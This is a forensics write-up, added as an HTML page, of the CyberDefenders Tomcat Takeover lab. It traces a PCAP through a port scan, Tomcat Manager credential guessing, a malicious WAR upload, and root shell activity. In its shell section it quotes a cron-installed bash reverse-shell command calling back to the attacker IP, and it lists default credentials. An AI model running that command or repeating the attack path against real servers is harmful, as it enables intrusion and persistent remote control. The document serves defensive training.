@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Tomcat Takeover Lab — CyberDefenders Writeup</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+  <style>
+    .writeup-layout .hero { overflow: visible; }
+    .writeup-layout .hero h1 {
+      max-width: 100%;
+      font-size: clamp(2.8rem, 7vw, 6rem);
+      line-height: 0.95;
+      letter-spacing: -0.06em;
+      overflow-wrap: normal;
+      word-break: normal;
+      hyphens: none;
+    }
+    .writeup-layout .hero h1 .title-line { display: block; }
+    .writeup-layout .hero h1 .gradient-word {
+      display: inline-block;
+      background: linear-gradient(90deg, #bff3ff, #38bdf8, #22d3ee, #2dd4bf);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .kill-chain {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+      gap: 14px;
+      margin: 22px 0;
+    }
+    .kill-step {
+      border: 1px solid rgba(56, 189, 248, .22);
+      background: rgba(8, 23, 43, .58);
+      border-radius: 18px;
+      padding: 16px;
+    }
+    .kill-step span {
+      display: block;
+      color: #7dd3fc;
+      font-family: "JetBrains Mono", monospace;
+      font-size: .78rem;
+      margin-bottom: 8px;
+    }
+    .kill-step strong { color: #e0f2fe; }
+    .timeline-list {
+      display: grid;
+      gap: 12px;
+      margin-top: 18px;
+    }
+    .timeline-item {
+      border-left: 3px solid rgba(34, 211, 238, .72);
+      padding: 12px 16px;
+      background: rgba(8, 23, 43, .48);
+      border-radius: 14px;
+    }
+    .timeline-item code { color: #a7f3d0; }
+    @media (max-width: 760px) {
+      .writeup-layout .hero h1 {
+        font-size: clamp(2.45rem, 13vw, 4.2rem);
+        line-height: 0.98;
+        letter-spacing: -0.05em;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header class="topbar">
+    <div class="wrap topbar-inner">
+      <a class="brand" href="/">ThaiNgoc :~$</a>
+      <nav class="nav">
+        <a href="/">Home</a>
+        <a href="/writeups/">Writeups</a>
+        <a href="/projects/">Projects</a>
+        <a href="/achievements/">Achievements</a>
+        <a href="/contact/">Contact</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap writeup-layout">
+    <aside class="toc glass-card">
+      <div class="toc-title">Contents</div>
+      <a href="#summary">Executive Summary</a>
+      <a href="#info">Lab Information</a>
+      <a href="#triage">PCAP Triage</a>
+      <a href="#smb">SMB Background Traffic</a>
+      <a href="#tomcat">Tomcat Identification</a>
+      <a href="#recon">Reconnaissance</a>
+      <a href="#auth">Tomcat Manager Access</a>
+      <a href="#upload">WAR Upload</a>
+      <a href="#shell">Shell & Persistence</a>
+      <a href="#enrichment">IP Enrichment</a>
+      <a href="#timeline">Timeline</a>
+      <a href="#ioc">IOCs</a>
+      <a href="#lessons">Lessons Learned</a>
+    </aside>
+
+    <article class="writeup-content">
+      <section class="hero glass-card">
+        <p class="eyebrow">CyberDefenders · Network Forensics · Tomcat Takeover</p>
+        <h1>
+          <span class="title-line">Tomcat</span>
+          <span class="title-line gradient-word">Takeover</span>
+          <span class="title-line">Lab</span>
+        </h1>
+        <p class="hero-subtitle">
+          PCAP investigation of an Apache Tomcat compromise involving port scanning,
+          Tomcat Manager enumeration, weak credential abuse, WAR deployment, root shell access,
+          cron persistence and command-and-control callbacks.
+        </p>
+
+        <div class="meta-grid">
+          <div><span>Platform</span><strong>CyberDefenders</strong></div>
+          <div><span>Category</span><strong>Network Forensics</strong></div>
+          <div><span>Tools</span><strong>Wireshark · NetworkMiner · CyberChef</strong></div>
+          <div><span>Focus</span><strong>Tomcat Manager · WAR Shell · C2</strong></div>
+        </div>
+      </section>
+
+      <section id="summary" class="glass-card section-card">
+        <h2>Executive Summary</h2>
+        <p>
+          In this lab, I analyzed a packet capture from an internal environment where the SOC team
+          suspected malicious activity against an Apache Tomcat web server. The investigation started
+          with normal PCAP triage: checking the capture timeframe, protocol distribution and active hosts
+          before drilling into individual HTTP streams.
+        </p>
+        <p>
+          The packet-level evidence shows that <code>14.0.0.120</code> performed reconnaissance against
+          <code>10.0.0.112</code>, discovered exposed services on ports <code>22</code>, <code>8080</code>
+          and <code>8009</code>, enumerated Tomcat management paths with Gobuster, tried common Tomcat
+          credentials, and eventually authenticated to Tomcat Manager with <code>admin:tomcat</code>.
+        </p>
+        <p>
+          After logging in, the attacker uploaded a malicious WAR file named <code>JXQOZY.war</code>
+          through <code>/manager/html/upload</code>. The deployed application was then accessed at
+          <code>/JXQOZY/</code>. A later TCP stream exposed interactive shell commands running as
+          <code>root</code>, followed by a cron-based reverse shell persistence mechanism pointing back to
+          <code>14.0.0.120:443</code>.
+        </p>
+        <div class="callout danger">
+          <strong>Impact:</strong> The Tomcat server was compromised through valid credential abuse,
+          malicious WAR deployment, command execution as <code>root</code>, and cron persistence for C2 callbacks.
+        </div>
+
+        <div class="kill-chain">
+          <div class="kill-step"><span>01</span><strong>Recon</strong><br>TCP SYN scan against the Tomcat host.</div>
+          <div class="kill-step"><span>02</span><strong>Discovery</strong><br>Open services: SSH, Tomcat HTTP and AJP.</div>
+          <div class="kill-step"><span>03</span><strong>Credential Access</strong><br>Tomcat Manager Basic Auth attempts.</div>
+          <div class="kill-step"><span>04</span><strong>Execution</strong><br>WAR deployment through Manager.</div>
+          <div class="kill-step"><span>05</span><strong>Persistence</strong><br>Cron job reverse shell.</div>
+          <div class="kill-step"><span>06</span><strong>C2</strong><br>Callback to attacker infrastructure.</div>
+        </div>
+      </section>
+
+      <section id="info" class="glass-card section-card">
+        <h2>Lab Information</h2>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Field</th><th>Details</th></tr>
+            <tr><td>Lab Name</td><td>Tomcat Takeover Lab</td></tr>
+            <tr><td>Platform</td><td>CyberDefenders</td></tr>
+            <tr><td>Category</td><td>Network Forensics</td></tr>
+            <tr><td>Scenario</td><td>Suspicious activity against an Apache Tomcat web server inside the company intranet.</td></tr>
+            <tr><td>Evidence</td><td><code>web server.pcap</code></td></tr>
+            <tr><td>Tools Used</td><td>Wireshark, NetworkMiner, CyberChef, VirusTotal/AbuseIPDB-style enrichment</td></tr>
+            <tr><td>MITRE-style Tactics</td><td>Reconnaissance, Execution, Persistence, Privilege Escalation, Credential Access, Discovery, Command and Control</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="triage" class="glass-card section-card">
+        <h2>1. Initial PCAP Triage</h2>
+        <p>
+          I started by opening the capture properties. In real SOC work, this is important because an analyst
+          should confirm that the evidence timeframe overlaps with the reported incident window before spending
+          time on deep packet analysis.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-01-capture-properties.png" alt="Wireshark capture properties for web server pcap">
+          <figcaption>The capture spans roughly 14 minutes and contains 21,070 packets.</figcaption>
+        </figure>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Property</th><th>Value</th></tr>
+            <tr><td>File</td><td><code>web server.pcap</code></td></tr>
+            <tr><td>Size</td><td><code>228 kB</code></td></tr>
+            <tr><td>SHA256</td><td><code>9a8dbb2ec48166ff541f81307544a5ceb07ce702f36d36fd8ae964bcb53716</code></td></tr>
+            <tr><td>First Packet</td><td><code>2023-09-11 01:13:06</code></td></tr>
+            <tr><td>Last Packet</td><td><code>2023-09-11 01:27:37</code></td></tr>
+            <tr><td>Elapsed</td><td><code>00:14:30</code></td></tr>
+            <tr><td>Total Packets</td><td><code>21,070</code></td></tr>
+          </table>
+        </div>
+        <p>
+          The packet list later displays timestamps around <code>2023-09-10 18:xx</code>. I treated the order
+          of events as reliable and noted that the difference is likely caused by Wireshark timestamp/timezone display settings.
+        </p>
+
+        <h3>Protocol and host overview</h3>
+        <p>
+          The protocol hierarchy showed a mostly TCP-based capture with HTTP and SSH traffic. Since the lab
+          title and scenario point to Tomcat, HTTP traffic on Tomcat-related ports became the main focus.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-02-protocol-hierarchy.png" alt="Wireshark protocol hierarchy showing TCP HTTP and SSH traffic">
+          <figcaption>HTTP, SSH and SMB were present, but HTTP was the main protocol for the Tomcat compromise.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-03-ipv4-endpoints.png" alt="Wireshark IPv4 endpoints showing active IP addresses">
+          <figcaption>Top active hosts included <code>10.0.0.112</code>, <code>10.0.0.120</code>, <code>10.0.0.115</code>, <code>10.0.0.105</code> and <code>14.0.0.120</code>.</figcaption>
+        </figure>
+      </section>
+
+      <section id="smb" class="glass-card section-card">
+        <h2>2. SMB Background Traffic</h2>
+        <p>
+          Before focusing on Tomcat, I reviewed the early SMB traffic. This helped map internal hosts and avoid
+          treating every packet as malicious without context.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-04-smb-session-setup.png" alt="SMB session setup between 10.0.0.115 and 10.0.0.105">
+          <figcaption>SMB session setup from <code>10.0.0.115</code> to <code>10.0.0.105:445</code>.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-05-smb-ntlm-host-account.png" alt="SMB NTLMSSP host and account details">
+          <figcaption>NTLMSSP metadata identified account <code>root</code>, domain <code>WORKGROUP</code> and host <code>CYBERDEFENDERS-VIRTUAL-MACHINE</code>.</figcaption>
+        </figure>
+        <p>
+          I then checked SMB object export to determine whether any transferred files were suspicious.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-06-smb-create-request.png" alt="SMB create request for work_report2023.pdf">
+          <figcaption>SMB Create Request for <code>work_report2023.pdf</code>.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-07-smb-export-objects.png" alt="Wireshark SMB export object list showing work reports">
+          <figcaption>Exported SMB objects included <code>work_report2022.pdf</code> and <code>work_report2023.pdf</code> from <code>\\10.0.0.105\shared</code>.</figcaption>
+        </figure>
+        <div class="callout">
+          The exported files appeared to contain simple work report text and did not become the main attack path.
+          In an investigation report, I would classify this branch as reviewed but low priority compared with the Tomcat HTTP traffic.
+        </div>
+      </section>
+
+      <section id="tomcat" class="glass-card section-card">
+        <h2>3. Identifying the Tomcat Server</h2>
+        <p>
+          I observed an SSH handshake where <code>10.0.0.115</code> connected to <code>10.0.0.112:22</code>,
+          showing that <code>10.0.0.112</code> exposed SSH.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-08-ssh-handshake.png" alt="SSH three way handshake to 10.0.0.112 port 22">
+          <figcaption><code>10.0.0.112</code> responded on TCP/22, indicating an SSH service.</figcaption>
+        </figure>
+        <p>
+          The more important evidence came from HTTP traffic to port <code>8080</code>. A request to
+          <code>http://10.0.0.112:8080/</code> returned the default Apache Tomcat page.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-09-tomcat-http-get.png" alt="HTTP GET request to Tomcat port 8080">
+          <figcaption>HTTP GET request from <code>10.0.0.115</code> to <code>10.0.0.112:8080</code>.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-10-tomcat-landing-page-stream.png" alt="Follow HTTP stream showing Apache Tomcat 7.0.88">
+          <figcaption>The response showed <code>Apache-Coyote/1.1</code> and <code>Apache Tomcat/7.0.88</code>.</figcaption>
+        </figure>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Host</th><th>Role</th></tr>
+            <tr><td><code>10.0.0.112</code></td><td>Victim server running Apache Tomcat on <code>8080</code> and SSH on <code>22</code></td></tr>
+            <tr><td><code>14.0.0.120</code></td><td>External attacker / scanner / later C2 endpoint</td></tr>
+            <tr><td><code>10.0.0.105</code></td><td>Internal SMB share host</td></tr>
+            <tr><td><code>10.0.0.115</code></td><td>Internal host observed in SMB/SSH/HTTP traffic</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="recon" class="glass-card section-card">
+        <h2>4. Reconnaissance and Open Port Discovery</h2>
+        <p>
+          I investigated <code>14.0.0.120</code> because it appeared as an unusual non-private IP in the capture.
+          Filtering on this IP revealed repeated TCP SYN packets to many destination ports on <code>10.0.0.112</code>,
+          which is consistent with TCP SYN scanning.
+        </p>
+        <pre><code>ip.src == 14.0.0.120 &amp;&amp; tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</code></pre>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-11-syn-scan.png" alt="SYN scan from 14.0.0.120 to 10.0.0.112">
+          <figcaption><code>14.0.0.120</code> sent SYN packets to multiple ports on <code>10.0.0.112</code>.</figcaption>
+        </figure>
+        <p>
+          To identify open ports, I filtered for SYN/ACK responses from the target back to the scanner.
+        </p>
+        <pre><code>ip.src == 10.0.0.112 &amp;&amp; ip.dst == 14.0.0.120 &amp;&amp; tcp.flags == 0x0012</code></pre>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-12-open-ports-synack.png" alt="SYN ACK responses showing open ports 22 8080 8009">
+          <figcaption>SYN/ACK responses revealed open ports <code>22</code>, <code>8080</code> and <code>8009</code>.</figcaption>
+        </figure>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Open Port</th><th>Likely Service</th><th>Why It Matters</th></tr>
+            <tr><td><code>22/tcp</code></td><td>SSH</td><td>Remote administration surface</td></tr>
+            <tr><td><code>8080/tcp</code></td><td>Apache Tomcat HTTP</td><td>Main Tomcat web interface and Manager access</td></tr>
+            <tr><td><code>8009/tcp</code></td><td>Tomcat AJP</td><td>Additional Tomcat connector exposure</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="auth" class="glass-card section-card">
+        <h2>5. Tomcat Manager Enumeration and Credential Access</h2>
+        <p>
+          After the scan, the attacker started interacting with Tomcat management endpoints. One stream showed
+          access to <code>/host-manager/html/*</code> with <code>User-Agent: gobuster/3.6</code>, indicating automated
+          directory enumeration.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-13-host-manager-401-packet.png" alt="Gobuster request to host manager returning 401 unauthorized">
+          <figcaption>Gobuster request to <code>/host-manager/html/*</code> returned <code>401 Unauthorized</code>.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-14-host-manager-401-stream.png" alt="Follow HTTP stream of host manager 401 response">
+          <figcaption>The response requested Basic Authentication for the Tomcat Host Manager application.</figcaption>
+        </figure>
+        <p>
+          I then reviewed Basic Authentication attempts against <code>/manager/html</code>. Multiple requests returned
+          <code>401 Unauthorized</code>, indicating that the attacker was trying common Tomcat credentials.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-15-manager-bruteforce-attempts.png" alt="Multiple Tomcat manager login attempts and 401 responses">
+          <figcaption>Repeated <code>GET /manager/html</code> requests and <code>401</code> responses showed password guessing behavior.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-16-common-tomcat-creds-reference.png" alt="Reference list of common Tomcat credentials">
+          <figcaption>Common Tomcat credentials matched the style of attempts seen in the PCAP.</figcaption>
+        </figure>
+        <p>
+          One failed Authorization header decoded to <code>tomcat:s3cr3t</code>, but the response was still
+          <code>401 Unauthorized</code>. This is a good reminder: decoding a credential does not prove success;
+          the HTTP response code must also be checked.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-17-failed-basic-auth-stream.png" alt="Failed Basic Auth attempt for Tomcat manager">
+          <figcaption>Failed Basic Auth attempt to <code>/manager/html</code>.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-18-failed-credential-decode.png" alt="CyberChef decoding failed Tomcat credential">
+          <figcaption>CyberChef decoded the failed credential attempt as <code>tomcat:s3cr3t</code>.</figcaption>
+        </figure>
+        <p>
+          The successful login used <code>Authorization: Basic YWRtaW46dG9tY2F0</code>, which decodes to
+          <code>admin:tomcat</code>. The server returned <code>HTTP/1.1 200 OK</code> and a <code>JSESSIONID</code>
+          scoped to <code>/manager</code>, confirming successful Tomcat Manager access.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-19-successful-manager-login.png" alt="Successful Tomcat Manager login with HTTP 200 OK">
+          <figcaption>Successful <code>GET /manager/html</code> with <code>200 OK</code> and a manager session cookie.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-20-successful-credential-decode.png" alt="CyberChef decoding successful Tomcat credential admin tomcat">
+          <figcaption>Base64 decoding confirmed the valid credential: <code>admin:tomcat</code>.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-21-login-success-timeline.png" alt="Packet timeline for successful Tomcat Manager login">
+          <figcaption>The successful login occurred at <code>2023-09-10 18:20:24.030141Z</code> in the packet list.</figcaption>
+        </figure>
+      </section>
+
+      <section id="upload" class="glass-card section-card">
+        <h2>6. Malicious WAR Upload and Deployment</h2>
+        <p>
+          Once authenticated, the attacker uploaded a WAR file through the Tomcat Manager upload endpoint.
+          The HTTP POST request contained a multipart form field named <code>deployWar</code> and the filename
+          <code>JXQOZY.war</code>.
+        </p>
+        <pre><code>ip.addr == 14.0.0.120 &amp;&amp; http.request.method == "POST"</code></pre>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-22-war-upload-packet.png" alt="POST request for Tomcat WAR upload">
+          <figcaption>POST request from <code>14.0.0.120</code> to <code>/manager/html/upload</code>.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-23-war-upload-stream.png" alt="WAR upload stream showing JXQOZY.war and WEB-INF">
+          <figcaption>The upload stream showed <code>filename="JXQOZY.war"</code> and WAR/ZIP structure such as <code>WEB-INF</code>.</figcaption>
+        </figure>
+        <p>
+          A WAR file is a Java web application archive. It uses ZIP-style structure internally, which explains
+          the <code>PK</code> bytes visible in the stream. In a Tomcat takeover scenario, a WAR often contains a JSP
+          web shell or payload that allows command execution after deployment.
+        </p>
+        <p>
+          After the upload, the attacker accessed the deployed application path <code>/JXQOZY/</code> and the
+          server returned <code>200 OK</code>. This confirmed that the WAR was successfully deployed.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-24-war-deploy-and-access.png" alt="Tomcat WAR upload followed by deployed path access">
+          <figcaption>After upload, <code>GET /JXQOZY/</code> returned <code>200 OK</code>.</figcaption>
+        </figure>
+      </section>
+
+      <section id="shell" class="glass-card section-card">
+        <h2>7. Reverse Shell, Root Context and Cron Persistence</h2>
+        <p>
+          Later in the capture, I noticed a TCP stream from the victim back to the attacker. Following the stream
+          revealed interactive command execution. The attacker first ran <code>whoami</code>, and the server returned
+          <code>root</code>.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-25-reverse-shell-stream.png" alt="Reverse shell TCP stream showing whoami root and cron persistence">
+          <figcaption>The shell stream revealed <code>whoami</code> returning <code>root</code>, followed by cron persistence commands.</figcaption>
+        </figure>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-26-reverse-shell-connection.png" alt="TCP connection from victim to attacker">
+          <figcaption>TCP connection from <code>10.0.0.112</code> back to <code>14.0.0.120</code>.</figcaption>
+        </figure>
+        <p>The commands observed in the shell included:</p>
+        <pre><code>whoami
+root
+
+cd /tmp
+pwd
+/tmp
+
+echo "* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/14.0.0.120/443 0&gt;&amp;1'" &gt; cron
+crontab -i cron
+crontab -l
+
+* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/14.0.0.120/443 0&gt;&amp;1'</code></pre>
+        <div class="callout danger">
+          This is the strongest compromise evidence in the capture: the attacker had shell access as
+          <code>root</code> and installed a cron job that attempted to run a reverse shell to
+          <code>14.0.0.120:443</code> every minute.
+        </div>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Observed Action</th><th>Interpretation</th></tr>
+            <tr><td><code>whoami</code> → <code>root</code></td><td>Command execution context was root</td></tr>
+            <tr><td><code>cd /tmp</code></td><td>Attacker used a common temporary staging directory</td></tr>
+            <tr><td><code>echo ... &gt; cron</code></td><td>Created a cron file containing a reverse shell</td></tr>
+            <tr><td><code>crontab -i cron</code></td><td>Installed the malicious cron job</td></tr>
+            <tr><td><code>crontab -l</code></td><td>Verified persistence was installed</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="enrichment" class="glass-card section-card">
+        <h2>8. Attacker IP Enrichment</h2>
+        <p>
+          I also checked the external IP <code>14.0.0.120</code> using IP enrichment. The lookup placed the IP
+          in Guangdong, China and associated it with ChinaNet Guangdong Province Network.
+        </p>
+        <figure class="evidence">
+          <img src="/assets/media/writeups/tomcat-takeover/tomcat-takeover-27-attacker-ip-enrichment.png" alt="IP geolocation details for 14.0.0.120">
+          <figcaption>IP enrichment for <code>14.0.0.120</code>.</figcaption>
+        </figure>
+        <div class="callout">
+          I treated geolocation only as IOC enrichment, not attribution. The conclusion that
+          <code>14.0.0.120</code> was the attacker/C2 host came from packet behavior: scan, enumeration,
+          authentication, WAR upload and callback traffic.
+        </div>
+      </section>
+
+      <section id="timeline" class="glass-card section-card">
+        <h2>Attack Timeline</h2>
+        <div class="timeline-list">
+          <div class="timeline-item"><strong>18:13:06</strong> — Early SMB traffic observed between <code>10.0.0.115</code> and <code>10.0.0.105:445</code>.</div>
+          <div class="timeline-item"><strong>18:15:51</strong> — Tomcat landing page accessed on <code>10.0.0.112:8080</code>, revealing <code>Apache Tomcat/7.0.88</code>.</div>
+          <div class="timeline-item"><strong>18:18:52</strong> — <code>14.0.0.120</code> performed TCP SYN scan against <code>10.0.0.112</code>.</div>
+          <div class="timeline-item"><strong>18:18:52–18:18:53</strong> — <code>10.0.0.112</code> responded with SYN/ACK on ports <code>22</code>, <code>8080</code> and <code>8009</code>.</div>
+          <div class="timeline-item"><strong>18:19:33</strong> — Gobuster enumeration against <code>/host-manager/html/*</code> returned <code>401 Unauthorized</code>.</div>
+          <div class="timeline-item"><strong>18:20:xx</strong> — Multiple Tomcat Manager Basic Auth attempts occurred; failed credential example: <code>tomcat:s3cr3t</code>.</div>
+          <div class="timeline-item"><strong>18:20:24</strong> — Successful Tomcat Manager login with <code>admin:tomcat</code> returned <code>200 OK</code>.</div>
+          <div class="timeline-item"><strong>18:22:14</strong> — Attacker uploaded <code>JXQOZY.war</code> through <code>/manager/html/upload</code>.</div>
+          <div class="timeline-item"><strong>18:22:23</strong> — Attacker accessed <code>/JXQOZY/</code>; server returned <code>200 OK</code>, confirming deployment.</div>
+          <div class="timeline-item"><strong>After deployment</strong> — Reverse shell activity observed; attacker ran commands as <code>root</code> and installed cron persistence to <code>14.0.0.120:443</code>.</div>
+        </div>
+      </section>
+
+      <section id="ioc" class="glass-card section-card">
+        <h2>Indicators of Compromise</h2>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Type</th><th>Indicator</th><th>Context</th></tr>
+            <tr><td>Attacker / C2 IP</td><td><code>14.0.0.120</code></td><td>Scanner, Tomcat Manager attacker, reverse shell destination</td></tr>
+            <tr><td>Victim IP</td><td><code>10.0.0.112</code></td><td>Apache Tomcat server</td></tr>
+            <tr><td>Tomcat Port</td><td><code>8080/tcp</code></td><td>Tomcat HTTP service</td></tr>
+            <tr><td>AJP Port</td><td><code>8009/tcp</code></td><td>Tomcat AJP connector exposed</td></tr>
+            <tr><td>Credential</td><td><code>admin:tomcat</code></td><td>Valid Tomcat Manager credential used by attacker</td></tr>
+            <tr><td>Failed Credential</td><td><code>tomcat:s3cr3t</code></td><td>Observed failed Basic Auth attempt</td></tr>
+            <tr><td>Uploaded File</td><td><code>JXQOZY.war</code></td><td>WAR file uploaded through Tomcat Manager</td></tr>
+            <tr><td>Deployed Path</td><td><code>/JXQOZY/</code></td><td>WAR deployment path</td></tr>
+            <tr><td>Upload Endpoint</td><td><code>/manager/html/upload</code></td><td>Tomcat Manager upload endpoint</td></tr>
+            <tr><td>Enumeration Tool</td><td><code>gobuster/3.6</code></td><td>User-Agent observed during path enumeration</td></tr>
+            <tr><td>Persistence</td><td><code>crontab</code></td><td>Reverse shell scheduled every minute</td></tr>
+            <tr><td>Persistence Callback</td><td><code>14.0.0.120:443</code></td><td>Target of cron-based bash reverse shell</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="lessons" class="glass-card section-card">
+        <h2>Lessons Learned</h2>
+        <p>
+          This lab reinforced a practical SOC workflow: start broad, map hosts, identify services, then pivot into
+          protocol-specific evidence. The most useful technique was correlating HTTP Basic Auth headers with response
+          status codes. A decoded credential alone is not enough; <code>401</code> means the attempt failed, while
+          <code>200 OK</code> plus a valid session cookie confirms success.
+        </p>
+        <p>
+          I also learned to separate evidence from enrichment. IP geolocation was useful for context, but the attacker
+          conclusion came from behavior inside the PCAP. The final compromise proof came from the shell stream showing
+          <code>whoami</code> returning <code>root</code> and cron persistence pointing back to the attacker IP.
+        </p>
+        <div class="callout">
+          Defensive takeaways: never expose Tomcat Manager publicly, disable weak/default credentials, restrict Manager
+          access by source IP, avoid running Tomcat as root, monitor WAR deployment activity, alert on suspicious
+          Basic Auth bursts, and hunt for cron jobs that execute reverse shell patterns.
+        </div>
+      </section>
+    </article>
+  </main>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
